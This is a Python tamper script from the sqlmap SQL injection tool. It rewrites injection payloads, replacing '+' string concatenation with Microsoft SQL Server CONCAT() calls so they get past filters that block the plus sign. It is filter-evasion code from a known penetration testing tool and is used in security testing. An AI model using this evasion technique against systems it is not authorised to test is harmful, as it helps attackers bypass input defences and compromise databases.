#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.common import zeroDepthSearch
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    """
    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart

    Tested against:
        * Microsoft SQL Server 2012

    Requirements:
        * Microsoft SQL Server 2012+

    Notes:
        * Useful in case ('+') character is filtered

    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'

    >>> tamper('SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL')
    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'
    """

    retVal = payload

    if payload:
        prefix, suffix = '+' * len(re.search(r"\A(\+*)", payload).group(0)), '+' * len(re.search(r"(\+*)\Z", payload).group(0))
        retVal = retVal.strip('+')

        while True:
            indexes = zeroDepthSearch(retVal, '+')

            if indexes:
                first, last = 0, 0
                for i in xrange(1, len(indexes)):
                    if ' ' in retVal[indexes[0]:indexes[i]]:
                        break
                    else:
                        last = i

                start = retVal[:indexes[first]].rfind(' ') + 1
                end = (retVal[indexes[last] + 1:].find(' ') + indexes[last] + 1) if ' ' in retVal[indexes[last] + 1:] else len(retVal) - 1

                chars = [char for char in retVal]
                for index in indexes[first:last + 1]:
                    chars[index] = ','

                retVal = "%sCONCAT(%s)%s" % (retVal[:start], ''.join(chars)[start:end], retVal[end:])
            else:
                match = re.search(r"\((CHAR\(\d+.+\bCHAR\(\d+\))\)", retVal)
                if match:
                    part = match.group(0)
                    indexes = set(zeroDepthSearch(match.group(1), '+'))
                    if not indexes:
                        break
                    chars = [char for char in part]
                    for i in xrange(1, len(chars)):
                        if i - 1 in indexes:
                            chars[i] = ','
                    replacement = "CONCAT%s" % "".join(chars)
                    retVal = retVal.replace(part, replacement)
                else:
                    break

        retVal = "%s%s%s" % (prefix, retVal, suffix)

    return retVal
